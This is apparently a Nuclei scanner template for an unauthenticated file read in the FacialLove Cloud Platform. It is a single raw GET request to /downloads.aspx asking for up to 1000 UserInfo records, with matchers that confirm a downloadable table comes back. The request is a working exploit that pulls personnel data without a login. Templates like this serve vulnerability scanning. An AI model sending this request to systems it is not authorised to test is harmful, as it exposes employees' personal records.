id: faciallovecloudplatform-unauth-fileread

info:
  name: FacialLove Cloud Platform Unauthenticated File Read
  author: k3ppf0r
  severity: high
  description: |
    This template checks for unauthenticated file read vulnerability in the FacialLove Cloud Platform. It sends a GET request to the downloads endpoint and checks if the response contains downloadable file content.
  reference:
    - https://blog.csdn.net/qq_37113223/article/details/138163145
  tags: 脸爱云一脸通智慧平台

http:
  - raw:
      - |
        GET /downloads.aspx?Ename=UserInfo&total=1000&jsonParam={"rybh":"","ryxm":"","EngName":"","groupname":"","companyname":"","bmmc":"","ryzt":"","rzstartime":"","rzendtime":"","lzstartime":"","lzendtime":"","zhiwu":"","cardid":"","rfzt":"","klb":"","sxstartime":"","sxendtime":"","khstartime":"","khendtime":"","rfoperator":"","rfstartime":"","rfendtime":"","feat":""} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "filename="

      - type: word
        part: body
        words:
          - "</td><td>"
          - "</tr><tr>"